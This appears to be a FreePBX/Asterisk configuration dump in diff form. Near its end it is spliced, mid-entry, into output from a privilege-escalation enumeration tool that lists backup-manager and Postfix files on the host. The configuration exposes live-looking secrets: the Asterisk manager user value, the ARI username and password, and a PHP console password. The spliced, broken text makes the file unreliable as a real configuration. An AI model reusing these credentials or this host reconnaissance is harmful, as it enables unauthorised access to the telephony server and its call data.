+# Asterisk Manager User
+# Default Value: admin
+AMPMGRUSER=wnPa2WbXJ/ED
+# Asterisk Manager Write Timeout
+# Default Value: 5000
+ASTMGRWRITETIMEOUT=5000
+#
+# --- CATEGORY: Asterisk REST Interface ---
+#
+# Enable the Asterisk REST Interface
+# Default Value: FALSE
+ENABLE_ARI=FALSE
+# ARI Username
+# Default Value: zkazRzvH3LLW
+FPBX_ARI_USER=zkazRzvH3LLW
+# Allowed Origins
+# Default Value: localhost:8088
+ARI_ALLOWED_ORIGINS=localhost:8088
+# ARI Password
+# Default Value: 04cd5eb91771e9eb716aeee1ed6812e0
+FPBX_ARI_PASSWORD=04cd5eb91771e9eb716aeee1ed6812e0
+# Pretty Print JSON Responses
+# Default Value: FALSE
+ENABLE_ARI_PP=FALSE
+# Web Socket Write Timeout
+# Default Value: 100
+ARI_WS_WRITE_TIMEOUT=100
+#
+# --- CATEGORY: Call Accounting Module ---
+#
+# Call Deck Priority 
+# Default Value: Trunks
+CA_CALL_DECK_PRIORITY=Trunks
+#
+# --- CATEGORY: Call Flow Control Module ---
+#
+# Hook Time Conditions Module
+# Default Value: FALSE
+DAYNIGHTTCHOOK=FALSE
+#
+# --- CATEGORY: Call Recording ---
+#
+# Beep every n seconds
+# Default Value: 
+CALLREC_BEEP_PERIOD=
+# Call Record Option
+# Default Value: TRUE
+CALL_REC_OPTION=TRUE
+#
+# --- CATEGORY: cdr ---
+#
+# Enable CDR Logging
+# Default Value: TRUE
+CDR_BATCH_ENABLE=TRUE
+# CDR Batch
+# Default Value: FALSE
+CDR_BATCH=FALSE
+# CDR Batch Size
+# Default Value: 200
+CDR_BATCH_SIZE=200
+# CDR Batch Time
+# Default Value: 300
+CDR_BATCH_TIME=300
+# CDR Schedule Only
+# Default Value: FALSE
+CDR_BATCH_SCHEDULE_ONLY=FALSE
+# CDR Batch Safe ShutDown
+# Default Value: TRUE
+CDR_BATCH_SAFE_SHUT_DOWN=TRUE
+#
+# --- CATEGORY: CEL Report Module ---
+#
+# Enable CEL Reporting
+# Default Value: TRUE
+CEL_ENABLED=TRUE
+# Remote CEL DB Name
+# Default Value: 
+CELDBNAME=
+# Remote CEL DB Table
+# Default Value: 
+CELDBTABLENAME=
+#
+# --- CATEGORY: Certificate Manager ---
+#
+# Validity period of the certificate (in days)
+# Default Value: 730
+CERT_DAYS_VAL=730
+#
+# --- CATEGORY: Conferences ---
+#
+# Force Allow Conference Recording
+# Default Value: FALSE
+FORCEALLOWCONFRECORDING=FALSE
+#
+# --- CATEGORY: Contact Manager Module ---
+#
+# Enable Favorite Contacts
+# Default Value: FALSE
+ENABLE_FAVORITE_CONTACTS=FALSE
+# Partial Match Length
+# Default Value: 7
+CONTACTMANLOOKUPLENGTH=7
+#
+# --- CATEGORY: Cron JOBS ---
+#
+# FreePBX JOBs Maximum Random sleep
+# Default Value: 0
+JOBSRANDOMSLEEP=0
+# Enable fwconsloe cron jobs execution logs
+# Default Value: FALSE
+FWJOBS_LOGS=FALSE
+#
+# --- CATEGORY: DAHDi Configuration Module ---
+#
+# Allow PRI Discrete Channels
+# Default Value: FALSE
+DAHDISHOWDIGITALCHANS=FALSE
+# DAHDi Executable Location
+# Default Value: /etc/init.d/dahdi
+DAHDIEXEC=/etc/init.d/dahdi
+# DAHDi Modules Location
+# Default Value: /etc/dahdi/modules
+DAHDIMODULESLOC=/etc/dahdi/modules
+# Disable DAHDi Configuration Writes
+# Default Value: TRUE
+DAHDIDISABLEWRITE=TRUE
+# ModProbe.d Configuration File Location
+# Default Value: /etc/modprobe.d/dahdi.conf
+DAHDIMODPROBELOC=/etc/modprobe.d/dahdi.conf
+# Software EC
+# Default Value: oslec
+DAHDIECHOCAN=oslec
+# System Configuration File Location
+# Default Value: /etc/dahdi/system.conf
+DAHDISYSTEMLOC=/etc/dahdi/system.conf
+# Use mock hardware instead of real hardware
+# Default Value: FALSE
+DAHDIMOCKHW=FALSE
+#
+# --- CATEGORY: Dashboard Module ---
+#
+# Disable collection of system statistics
+# Default Value: FALSE
+SYS_STATS_DISABLE=FALSE
+# Display firewall status
+# Default Value: TRUE
+VIEW_FW_STATUS=TRUE
+# Expiry time for system statistics
+# Default Value: 50
+SYS_STATS_MAXAGE=50
+#
+# --- CATEGORY: Developer and Customization ---
+#
+# Always Download Web Assets
+# Default Value: FALSE
+FORCE_JS_CSS_IMG_DOWNLOAD=FALSE
+# AMPLOCALBIN Dir for retrieve_conf
+# Default Value: 
+AMPLOCALBIN=
+# Debug File
+# Default Value: /var/log/asterisk/freepbx_dbug
+FPBXDBUGFILE=/var/log/asterisk/freepbx_dbug
+# Developer Mode
+# Default Value: FALSE
+DEVEL=FALSE
+# Disable FreePBX dbug Logging
+# Default Value: TRUE
+FPBXDBUGDISABLE=TRUE
+# Disable Mainstyle CSS Compression
+# Default Value: FALSE
+DISABLE_CSS_AUTOGEN=FALSE
+# Disable Module Admin Caching
+# Default Value: FALSE
+MODULEADMIN_SKIP_CACHE=FALSE
+# Display Monitor Trunk Failures Option
+# Default Value: FALSE
+DISPLAY_MONITOR_TRUNK_FAILURES_FIELD=FALSE
+# Enable jQuery Migrate
+# Default Value: TRUE
+JQMIGRATE=TRUE
+# Enable Performance Logging
+# Default Value: FALSE
+FPBXPERFLOGGING=FALSE
+# Leave Reload Bar Up
+# Default Value: FALSE
+DEVELRELOAD=FALSE
+# Post Call Recording Script
+# Default Value: 
+MIXMON_POST=
+# POST_RELOAD Debug Mode
+# Default Value: FALSE
+POST_RELOAD_DEBUG=FALSE
+# POST_RELOAD Script
+# Default Value: 
+POST_RELOAD=
+# PRE_RELOAD Script
+# Default Value: 
+PRE_RELOAD=
+# Provide Verbose Tracebacks
+# Default Value: FALSE
+DIE_FREEPBX_VERBOSE=FALSE
+# Use Packaged Javascript Library 
+# Default Value: TRUE
+USE_PACKAGED_JS=TRUE
+#
+# --- CATEGORY: Device Settings ---
+#
+# Require Strong Secrets
+# Default Value: TRUE
+DEVICE_STRONG_SECRETS=TRUE
+# Remove mailbox Setting when no Voicemail
+# Default Value: FALSE
+DEVICE_REMOVE_MAILBOX=FALSE
+# SIP canrenivite (directmedia)
+# Default Value: no
+DEVICE_SIP_CANREINVITE=no
+# SIP DTMF Signaling
+# Default Value: rfc2833
+DEVICE_SIP_DTMF=rfc2833
+# SIP trustrpid
+# Default Value: yes
+DEVICE_SIP_TRUSTRPID=yes
+# SIP sendrpid
+# Default Value: pai
+DEVICE_SIP_SENDRPID=pai
+# SIP nat
+# Default Value: yes
+DEVICE_SIP_NAT=yes
+# SIP encryption
+# Default Value: no
+DEVICE_SIP_ENCRYPTION=no
+# SIP qualifyfreq
+# Default Value: 60
+DEVICE_SIP_QUALIFYFREQ=60
+# SIP and IAX qualify
+# Default Value: yes
+DEVICE_QUALIFY=yes
+# SIP and IAX allow
+# Default Value: 
+DEVICE_ALLOW=
+# SIP and IAX disallow
+# Default Value: 
+DEVICE_DISALLOW=
+# SIP and DAHDi callgroup
+# Default Value: 
+DEVICE_CALLGROUP=
+# SIP and DAHDi pickupgroup
+# Default Value: 
+DEVICE_PICKUPGROUP=
+#
+# --- CATEGORY: Dialplan and Operational ---
+#
+# Asterisk Dial Options
+# Default Value: HhTtr
+DIAL_OPTIONS=HhTtr
+# Asterisk Outbound Trunk Dial Options
+# Default Value: T
+TRUNK_OPTIONS=T
+# Attended Transfer Alert Info
+# Default Value: inherit
+ATTTRANSALERTINFO=inherit
+# Blind Transfer Alert Info
+# Default Value: inherit
+BLINDTRANSALERTINFO=inherit
+# Block CNAM on External Trunks
+# Default Value: FALSE
+BLOCK_OUTBOUND_TRUNK_CNAM=FALSE
+# Call Forward Ringtimer Default
+# Default Value: 0
+CFRINGTIMERDEFAULT=0
+# Call Recording Policy
+# Default Value: caller
+REC_POLICY=caller
+# Clear Global Variables
+# Default Value: FALSE
+CLEARGLOBALVARS=FALSE
+# Conference Room App
+# Default Value: app_confbridge
+ASTCONFAPP=app_confbridge
+# Convert ZAP Settings to DAHDi
+# Default Value: FALSE
+ZAP2DAHDICOMPAT=TRUE
+# Country Indication Tones
+# Default Value: us
+TONEZONE=us
+# CW Enabled by Default
+# Default Value: TRUE
+ENABLECW=TRUE
+# Disable -custom Context Includes
+# Default Value: FALSE
+DISABLECUSTOMCONTEXTS=FALSE
+# Disallow transfer features for inbound callers
+# Default Value: TRUE
+INBOUND_NOTRANS=TRUE
+# Display CallerID on Calling Phone
+# Default Value: TRUE
+OUTBOUND_CID_UPDATE=TRUE
+# Display Dialed Number on Calling Phone
+# Default Value: TRUE
+OUTBOUND_DIAL_UPDATE=TRUE
+# Display Presence State of Callee
+# Default Value: TRUE
+CONNECTEDLINE_PRESENCESTATE=TRUE
+# Ditech VQA Inbound Setting
+# Default Value: 7
+DITECH_VQA_INBOUND=7
+# Ditech VQA Outbound Setting
+# Default Value: 7
+DITECH_VQA_OUTBOUND=7
+# Dynamically Generate Hints
+# Default Value: FALSE
+DYNAMICHINTS=FALSE
+# Enforce RFC7462
+# Default Value: TRUE
+RFC7462=TRUE
+# Extension Concurrency Limit
+# Default Value: 3
+CONCURRENCYLIMITDEFAULT=3
+# Feature Codes Beep Only
+# Default Value: FALSE
+FCBEEPONLY=FALSE
+# Force All Internal Auto Answer
+# Default Value: FALSE
+FORCE_INTERNAL_AUTO_ANSWER_ALL=FALSE
+# Generate Diversion Headers
+# Default Value: FALSE
+DIVERSIONHEADER=FALSE
+# Internal Alert Info
+# Default Value: inherit
+INTERNALALERTINFO=inherit
+# Internal Auto Answer Default
+# Default Value: disabled
+DEFAULT_INTERNAL_AUTO_ANSWER=disabled
+# Launch local AGIs through FastAGI Server
+# Default Value: TRUE
+LAUNCH_AGI_AS_FASTAGI=TRUE
+# NoOp Traces in Dialplan
+# Default Value: 0
+NOOPTRACE=0
+# Occupied Lines CW Busy
+# Default Value: TRUE
+CWINUSEBUSY=TRUE
+# Only Use Last CID Prepend
+# Default Value: TRUE
+CID_PREPEND_REPLACE=TRUE
+# Polling Interval for Stopping Asterisk
+# Default Value: 2
+ASTSTOPPOLLINT=2
+# Ringtime Default
+# Default Value: 15
+RINGTIMER=15
+# SIP Channel Driver
+# Default Value: chan_pjsip
+ASTSIPDRIVER=chan_pjsip
+# Speaking Clock Time Format
+# Default Value: 12 Hour Format
+TIMEFORMAT=12\ Hour\ Format
+# Trunk Dial Timeout
+# Default Value: 300
+TRUNK_RING_TIMER=300
+# Use bad-number Context
+# Default Value: TRUE
+AMPBADNUMBER=TRUE
+# Use Experimental Dialparties Dialplan
+# Default Value: FALSE
+DIALPARTIESDIALPLAN=FALSE
+# Use Google DNS for Enum
+# Default Value: FALSE
+USEGOOGLEDNSFORENUM=FALSE
+# Waiting Period to Stop Asterisk
+# Default Value: 120
+ASTSTOPTIMEOUT=120
+#
+# --- CATEGORY: Directory Layout ---
+#
+# Asterisk AGI Dir
+# Default Value: /var/lib/asterisk/agi-bin
+ASTAGIDIR=/var/lib/asterisk/agi-bin
+# Asterisk bin Dir
+# Default Value: /var/lib/asterisk
+ASTVARLIBDIR=/var/lib/asterisk
+# Asterisk etc Dir
+# Default Value: /etc/asterisk
+ASTETCDIR=/etc/asterisk
+# Asterisk Log Dir
+# Default Value: /var/log/asterisk
+ASTLOGDIR=/var/log/asterisk
+# Asterisk Modules Dir
+# Default Value: /usr/lib/asterisk/modules
+ASTMODDIR=/usr/lib64/asterisk/modules
+# Asterisk Run Dir
+# Default Value: /var/run/asterisk
+ASTRUNDIR=/var/run/asterisk
+# Asterisk Spool Dir
+# Default Value: /var/spool/asterisk
+ASTSPOOLDIR=/var/spool/asterisk
+# Browser Playback Cache Directory
+# Default Value: /var/lib/asterisk/playback
+AMPPLAYBACK=/var/lib/asterisk/playback
+# Certificate File Location
+# Default Value: /etc/asterisk/keys
+CERTKEYLOC=/etc/asterisk/keys
+# CGI Dir
+# Default Value: /var/www/cgi-bin
+AMPCGIBIN=/var/www/cgi-bin
+# FreePBX bin Dir
+# Default Value: /var/lib/asterisk/bin
+AMPBIN=/var/lib/asterisk/bin
+# FreePBX sbin Dir
+# Default Value: /usr/sbin
+AMPSBIN=/usr/sbin
+# FreePBX Web Root Dir
+# Default Value: /var/www/html
+AMPWEBROOT=/var/www/html
+# MoH Subdirectory
+# Default Value: moh
+MOHDIR=moh
+# Override Call Recording Location
+# Default Value: 
+MIXMON_DIR=
+#
+# --- CATEGORY: Flash Operator Panel ---
+#
+# FOP Web Root Dir
+# Default Value: 
+FOPWEBROOT=cxpanel
+#
+# --- CATEGORY: Follow Me Module ---
+#
+# Create Follow Me at Extension Creation Time
+# Default Value: FALSE
+FOLLOWME_AUTO_CREATE=FALSE
+# Disable Follow Me Upon Creation
+# Default Value: TRUE
+FOLLOWME_DISABLED=TRUE
+# Default Follow Me Ring Time
+# Default Value: 20
+FOLLOWME_TIME=20
+# Default Follow Me Initial Ring Time
+# Default Value: 7
+FOLLOWME_PRERING=7
+# Default Follow Me Ring Strategy
+# Default Value: ringallv2-prim
+FOLLOWME_RG_STRATEGY=ringallv2-prim
+#
+# --- CATEGORY: GUI Behavior ---
+#
+# Abort Config Gen on Bad Dest
+# Default Value: FALSE
+BADDESTABORT=FALSE
+# Abort Config Gen on Exten Conflict
+# Default Value: FALSE
+XTNCONFLICTABORT=FALSE
+# Check Server Referrer
+# Default Value: TRUE
+CHECKREFERER=TRUE
+# Enable The Old Style FreePBX Dial Patterns Textarea
+# Default Value: FALSE
+ENABLEOLDDIALPATTERNS=FALSE
+# Include Server Name in Browser
+# Default Value: FALSE
+SERVERINTITLE=FALSE
+# Report Unknown Dest as Error
+# Default Value: TRUE
+CUSTOMASERROR=TRUE
+# Require Confirm with Apply Changes
+# Default Value: TRUE
+RELOADCONFIRM=TRUE
+# Set Module Admin to Edge mode
+# Default Value: FALSE
+MODULEADMINEDGE=FALSE
+# Show Language setting
+# Default Value: FALSE
+SHOWLANGUAGE=FALSE
+# Size of generated sip secrets
+# Default Value: 32
+SIPSECRETSIZE=32
+# Use freepbx_menu.conf Configuration
+# Default Value: FALSE
+USE_FREEPBX_MENU_CONF=FALSE
+# Use wget For Module Admin
+# Default Value: FALSE
+MODULEADMINWGET=FALSE
+#
+# --- CATEGORY: Internal Use ---
+#
+# Browser Playback Day Cache
+# Default Value: 30
+CACHE_CLEANUP_DAYS=30
+# Session Timeout
+# Default Value: 2592000
+SESSION_TIMEOUT=2592000
+#
+# --- CATEGORY: Log Display ---
+#
+# Disable call count in to main grid
+# Default Value: FALSE
+BLACKLIST_DISABLE_GRID_COUNT=FALSE
+#
+# --- CATEGORY: Outbound Routes Email Notifications ---
+#
+# Allow Data from other Modules
+# Default Value: FALSE
+ALLOW_MODULE_HOOK_IN=FALSE
+#
+# --- CATEGORY: Paging ---
+#
+# Max Paging Participants
+# Default Value: 40
+PAGINGMAXPARTICIPANTS=40
+# Alert Info for D/P Phones
+# Default Value: ring-answer
+PAGING_D_P_AlertInfo=ring-answer
+#
+# --- CATEGORY: Phone Apps ---
+#
+# Enable DPMA Apps Logging
+# Default Value: FALSE
+DPMAapps_LOG=FALSE
+# Enable Token Based Security
+# Default Value: FALSE
+ENABLE_RESTAPPS_TOKEN_SEC=FALSE
+#
+# --- CATEGORY: Process Management ---
+#
+# Disable PM2 Logging
+# Default Value: FALSE
+PM2DISABLELOG=FALSE
+# NPM Proxy Server Address
+# Default Value: http://mirror.freepbx.org:6767/
+PM2PROXY=http://mirror.freepbx.org:6767/
+# Shell Executable
+# Default Value: /bin/bash
+PM2SHELL=/bin/bash
+# Use package caching for NPM
+# Default Value: TRUE
+PM2USECACHE=TRUE
+# Use Proxy Server for NPM
+# Default Value: FALSE
+PM2USEPROXY=FALSE
+#
+# --- CATEGORY: Proxy Settings ---
+#
+# Use HTTP(S) Proxy
+# Default Value: FALSE
+PROXY_ENABLED=FALSE
+# Proxy Address
+# Default Value: 
+PROXY_ADDRESS=
+# Proxy Username
+# Default Value: 
+PROXY_USERNAME=
+# Proxy Password
+# Default Value: 
+PROXY_PASSWORD=
+#
+# --- CATEGORY: Queue Callback ---
+#
+# CallBack Daemon Data Retention
+# Default Value: 20
+VQPLUSRETENTION=20
+#
+# --- CATEGORY: Queue Wallboard ---
+#
+# Data Retention
+# Default Value: 30
+QSTATSDATARETENTION=30
+# Data sync cutoff time
+# Default Value: 1 week
+QSTATSSYNCCUTOFF=1\ week
+#
+# --- CATEGORY: Queues Module ---
+#
+# Persistent Members
+# Default Value: TRUE
+QUEUES_PESISTENTMEMBERS=TRUE
+# Honor Wrapup Time Across Queues
+# Default Value: TRUE
+QUEUES_SHARED_LASTCALL=TRUE
+# Set Agent Name in CDR dstchannel
+# Default Value: FALSE
+QUEUES_UPDATECDR=FALSE
+# Use MixMonitor for Recordings
+# Default Value: TRUE
+QUEUES_MIX_MONITOR=TRUE
+# Agent Called Events Default
+# Default Value: FALSE
+QUEUES_EVENTS_WHEN_CALLED_DEFAULT=FALSE
+# Member Status Event Default
+# Default Value: FALSE
+QUEUES_EVENTS_MEMEBER_STATUS_DEFAULT=FALSE
+#
+# --- CATEGORY: QXact Reports ---
+#
+# Data Retention
+# Default Value: 90
+QXACTDATARETENTION=90
+# Queue log Data Retention
+# Default Value: 0
+QLOGDATARETENTION=0
+# Remote Queuelog table name
+# Default Value: 
+QXACTREMOTEDBTABLENAME=
+#
+# --- CATEGORY: Remote CDR Database ---
+#
+# Remote CDR DB Host
+# Default Value: 
+CDRDBHOST=
+# Remote CDR DB Name
+# Default Value: 
+CDRDBNAME=
+# Remote CDR DB Password
+# Default Value: 
+CDRDBPASS=
+# Remote CDR DB Port
+# Default Value: 
+CDRDBPORT=
+# Remote CDR DB Table
+# Default Value: 
+CDRDBTABLENAME=
+# Remote CDR DB Type
+# Default Value: 
+CDRDBTYPE=
+# Remote CDR DB User
+# Default Value: 
+CDRDBUSER=
+# Use GMT Time
+# Default Value: FALSE
+CDRUSEGMT=FALSE
+#
+# --- CATEGORY: Ring Group Module ---
+#
+# Display Extension Ring Group Members
+# Default Value: FALSE
+EXTENSION_LIST_RINGGROUPS=FALSE
+#
+# --- CATEGORY: Sangoma CRM ---
+#
+# API Cache expiration
+# Default Value: 300
+CRM_CACHE_EXPIRE=300
+# Custom CRM url
+# Default Value: 
+CRM_CUSTOM_URL=
+# Disable CRM Logging
+# Default Value: TRUE
+CRM_LOG=TRUE
+#
+# --- CATEGORY: Sangoma RTAPI ---
+#
+# Enable RTAPI Logs
+# Default Value: FALSE
+SANGOMA_RTAPI_ENABLE_LOGS=FALSE
+# Enable Intercom Logs
+# Default Value: FALSE
+RTAPI_FEATURE_LOGS_INTERCOM=FALSE
+# Enable Queue App Logs
+# Default Value: FALSE
+RTAPI_FEATURE_LOGS_QUEUE_APP=FALSE
+# Enable Conference Logs
+# Default Value: FALSE
+RTAPI_FEATURE_LOGS_CONFERENCE=FALSE
+# Enable Making Calls With Logs
+# Default Value: FALSE
+RTAPI_FEATURE_LOGS_MAKING_CALLS_WITH=FALSE
+#
+# --- CATEGORY: Sangomaconnect ---
+#
+# Enable Sangomaconnect service
+# Default Value: FALSE
+SANGOMACONNECTENABLED=FALSE
+# Sangomaconnect server Bind Port
+# Default Value: 8443
+SANGOMACONNECTBINDPORT=8443
+# Sangomaconnect server TLS Certificate Location
+# Default Value: 
+SANGOMACONNECTTLSCERTFILE=
+# Sangomaconnect server TLS Private Key Location
+# Default Value: 
+SANGOMACONNECTTLSPRIVATEKEY=
+#
+# --- CATEGORY: SIPStation Module ---
+#
+# Use PJSIP for SIPStation trunks
+# Default Value: TRUE
+ENABLE_SS_PJSIP=TRUE
+#
+# --- CATEGORY: SmartOffice ---
+#
+# Enable SmartOffice service
+# Default Value: TRUE
+IOTENABLED=TRUE
+# Expose PBX Admin UI through CloudConnect Agent
+# Default Value: FALSE
+IOTEXPOSEWEB=FALSE
+# SmartOffice domain
+# Default Value: 
+IOTDOMAIN=
+# SmartOffice server Bind Port
+# Default Value: 8100
+IOTBINDPORT=8100
+# SmartOffice server organization display name
+# Default Value: SmartOffice
+IOTDISPLAYNAME=SmartOffice
+# SmartOffice server TLS Certificate Location
+# Default Value: 
+IOTTLSCERTFILE=
+# SmartOffice server TLS Private Key Location
+# Default Value: 
+IOTTLSPRIVATEKEY=
+#
+# --- CATEGORY: Styling and Logos ---
+#
+# Image: Left Upper
+# Default Value: images/tango.png
+BRAND_IMAGE_TANGO_LEFT=images/tango.png
+# Image: Footer
+# Default Value: images/freepbx_small.png
+BRAND_IMAGE_FREEPBX_FOOT=images/freepbx_small.png
+# Image: Footer
+# Default Value: images/sangoma-horizontal_thumb.png
+BRAND_IMAGE_SPONSOR_FOOT=images/sangoma-horizontal_thumb.png
+# Alt for Left Logo
+# Default Value: FreePBX
+BRAND_FREEPBX_ALT_LEFT=FreePBX
+# Alt for Footer Logo
+# Default Value: FreePBX&reg;
+BRAND_FREEPBX_ALT_FOOT=FreePBX&reg;
+# Alt for Footer Logo
+# Default Value: www.sangoma.com
+BRAND_SPONSOR_ALT_FOOT=www.sangoma.com
+# Link for Left Logo
+# Default Value: http://www.freepbx.org
+BRAND_IMAGE_FREEPBX_LINK_LEFT=http://www.freepbx.org
+# Link for Footer Logo
+# Default Value: http://www.freepbx.org
+BRAND_IMAGE_FREEPBX_LINK_FOOT=http://www.freepbx.org
+# Link for Sponsor Footer Logo
+# Default Value: http://www.sangoma.com
+BRAND_IMAGE_SPONSOR_LINK_FOOT=http://www.sangoma.com
+# Primary CSS Stylesheet
+# Default Value: 
+BRAND_CSS_ALT_MAINSTYLE=
+# Primary CSS Popover Stylesheet Addtion
+# Default Value: 
+BRAND_CSS_ALT_POPOVER=
+# Optional Additional CSS Stylesheet
+# Default Value: 
+BRAND_CSS_CUSTOM=
+#
+# --- CATEGORY: Synology Active Backup for Business ---
+#
+# Path for abb-cli
+# Default Value: /usr/bin/abb-cli
+SYNOLOGYABFBABBCLI=/usr/bin/abb-cli
+#
+# --- CATEGORY: System Apps ---
+#
+# Path for asterisk
+# Default Value: /usr/sbin/asterisk
+WHICH_asterisk=/usr/sbin/asterisk
+# Path for at
+# Default Value: /usr/bin/at
+WHICH_at=/usr/bin/at
+# Path for ffmpeg
+# Default Value: /usr/bin/ffmpeg
+WHICH_ffmpeg=/usr/bin/ffmpeg
+# Path for fwconsole
+# Default Value: /usr/sbin/fwconsole
+WHICH_fwconsole=/usr/sbin/fwconsole
+# Path for gs
+# Default Value: /usr/bin/gs
+WHICH_gs=/usr/bin/gs
+# Path for ipset
+# Default Value: /usr/sbin/ipset
+WHICH_ipset=/usr/sbin/ipset
+# Path for lame
+# Default Value: /usr/bin/lame
+WHICH_lame=/usr/bin/lame
+# Path for mpg123
+# Default Value: /usr/bin/mpg123
+WHICH_mpg123=/usr/bin/mpg123
+# Path for netstat
+# Default Value: /usr/bin/netstat
+WHICH_netstat=/usr/bin/netstat
+# Path for openssl
+# Default Value: /usr/bin/openssl
+WHICH_openssl=/usr/bin/openssl
+# Path for sox
+# Default Value: /usr/bin/sox
+WHICH_sox=/usr/bin/sox
+# Path for tiff2pdf
+# Default Value: /usr/bin/tiff2pdf
+WHICH_tiff2pdf=/usr/bin/tiff2pdf
+# Path for tiffinfo
+# Default Value: /usr/bin/tiffinfo
+Time Format
+# Default Value: LT
+MTIMEFORMAT=LT
+# PHP Console
+# Default Value: FALSE
+PHP_CONSOLE=FALSE
+# PHP Console Password
+# Default Value: batteryhorsestaple
+PHP_CONSOLE_PASSWORD=batteryhorsestaple
+# PHP Error Log Output
+# Default Value: freepbxlog
+PHP_ERROR_HANDLER_OUTPUT=freepbxlog
+# PHP Error Level
+# Default Value: ALL_NOSTRICTNOTICE
+PHP_ERROR_LEVEL=ALL_NOSTRICTNOTICE
+# Aggresively Check for Duplicate Extensions
+# Default Value: FALSE
+AGGRESSIVE_DUPLICATE_CHECK=FALSE
+# User & Devices Mode
+# Default Value: extensions
+AMPEXTENSIONS=extensions
+# Expose All Feature Codes
+# Default Value: FALSE
+EXPOSE_ALL_FEATURE_CODES=FALSE
+# Authorization Type
+# Default Value: database
+AUTHTYPE=usermanager
+# Allow Login With DB Credentials
+# Default Value: FALSE
+AMP_ACCESS_DB_CREDS=FALSE
+# Force Asterisk Version
+# Default Value: 
+FORCED_ASTVERSION=
+# Asterisk VMU Mask
+# Default Value: 007
+AMPVMUMASK=007
+# Browser Stats
+# Default Value: TRUE
+BROWSER_STATS=TRUE
+# Cache MoH Classes
+# Default Value: TRUE
+CACHERTCLASSES=TRUE
+# Call Recording Format
+# Default Value: wav
+MIXMON_FORMAT=wav
+# Default language
+# Default Value: en_US
+UIDEFAULTLANG=en_US
+# Enable Module Signature Checking
+# Default Value: TRUE
+SIGNATURECHECK=TRUE
+# Enable Module Tracks
+# Default Value: TRUE
+AMPTRACKENABLE=TRUE
+# FreePBX Web Address
+# Default Value: 
+AMPWEBADDRESS=
+# PHP Timezone
+# Default Value: UTC
+PHPTIMEZONE=UTC
+# RSS Feeds
+# Default Value: http://www.freepbx.org/rss.xml\nhttp://feeds.feedburner.com/InsideTheAsterisk
+RSSFEEDS=http://www.freepbx.org/rss.xml
+http://feeds.feedburner.com/InsideTheAsterisk
+# System Asterisk Group
+# Default Value: asterisk
+AMPASTERISKGROUP=asterisk
+# System Asterisk User
+# Default Value: asterisk
+AMPASTERISKUSER=asterisk
+# System Device Group
+# Default Value: asterisk
+AMPDEVGROUP=asterisk
+# System Device User
+# Default Value: asterisk
+AMPDEVUSER=asterisk
+# System Identity
+# Default Value: VoIP Server
+FREEPBX_SYSTEM_IDENT=VoIP\ Server
+# System Web Group
+# Default Value: asterisk
+AMPASTERISKWEBGROUP=asterisk
+# System Web User
+# Default Value: asterisk
+AMPASTERISKWEBUSER=asterisk
+# Telephony Engine
+# Default Value: asterisk
+AMPENGINE=asterisk
+# Use Google Distribution Network for js Downloads
+# Default Value: FALSE
+USE_GOOGLE_CDN_JS=FALSE
+#
+# --- CATEGORY: Time Condition Module ---
+#
+# Enable Maintenance Polling
+# Default Value: TRUE
+TCMAINT=TRUE
+# Maintenance Polling Interval
+# Default Value: 60
+TCINTERVAL=60
+#
+# --- CATEGORY: UCP NodeJS Server ---
+#
+# Enable the NodeJS Server
+# Default Value: TRUE
+NODEJSENABLED=TRUE
+# Enable TLS for the NodeJS Server
+# Default Value: FALSE
+NODEJSTLSENABLED=TRUE
+# NodeJS Bind Address
+# Default Value: ::
+NODEJSBINDADDRESS=::
+# NodeJS Bind Port
+# Default Value: 8001
+NODEJSBINDPORT=8001
+# NodeJS HTTPS Bind Address
+# Default Value: ::
+NODEJSHTTPSBINDADDRESS=::
+# NodeJS HTTPS Bind Port
+# Default Value: 8003
+NODEJSHTTPSBINDPORT=8003
+# NodeJS HTTPS TLS Certificate Location
+# Default Value: 
+NODEJSTLSCERTFILE=/etc/asterisk/keys/integration/certificate.pem
+# NodeJS HTTPS TLS Private Key Location
+# Default Value: 
+NODEJSTLSPRIVATEKEY=/etc/asterisk/keys/integration/webserver.key
+#
+# --- CATEGORY: User Control Panel ---
+#
+# Allow Password Changes
+# Default Value: TRUE
+UCPCHANGEPASSWORD=TRUE
+# Allow Username Changes
+# Default Value: TRUE
+UCPCHANGEUSERNAME=TRUE
+# RSS Feeds
+# Default Value: 
+UCPRSSFEEDS=
+# UCP Session Timeout
+# Default Value: 30
+UCPSESSIONTIMEOUT=30
+#
+# --- CATEGORY: User Management Module ---
+╔══════════╣ Analyzing Backup Manager Files (limit 70)
+lrwxrwxrwx. 1 asterisk asterisk 52 Nov 30  2025 /var/lib/asterisk/bin/storage.php -> /var/www/html/admin/modules/sysadmin/bin/storage.php
+-rwxr-xr-x. 1 asterisk asterisk 26803 Nov  2  2023 /var/www/html/admin/modules/sysadmin/bin/storage.php
+-rw-rw-r--. 1 asterisk asterisk 11060 Nov  2  2023 /var/www/html/admin/modules/sysadmin/functions.inc/storage.php
+-rw-rw-r--. 1 asterisk asterisk 33511 Nov  2  2023 /var/www/html/admin/modules/sysadmin/views/storage.php
+
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+-rw-r--r--. 1 root root 1529 Apr  1  2020 /etc/aliases
+-rw-r--r--. 1 root root 9854 Nov 30  2025 /usr/share/mime/aliases
+
+drwxr-xr-x. 2 root root 154 Nov 30  2025 /etc/postfix
+-rw-r--r--. 1 root root 6105 Apr  1  2020 /etc/postfix/master.cf
+#  flags=DRhu user=vmail argv=/usr/local/bin/maildrop -d ${recipient}
+#  user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -r ${sender} -m ${extension} ${user}
+#  flags=R user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -m ${extension} ${user}
+#  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
+#  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
+#  flags=Fq. user=bsmtp argv=/usr/local/sbin/bsmtp -f $sender $nexthop $recipient
+#  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store
+#  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
+
+drwxr-xr-x. 2 root root 4096 Nov 30  2025 /usr/libexec/postfix
+-rw-r--r--. 1 root root 6105 Apr  1  2020 /usr/libexec/postfix/master.cf
+#  flags=DRhu user=vmail argv=/usr/local/bin/maildrop -d ${recipient}
+#  user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -r ${sender} -m ${extension} ${user}
+#  flags=R user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -m ${extension} ${user}
+#  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
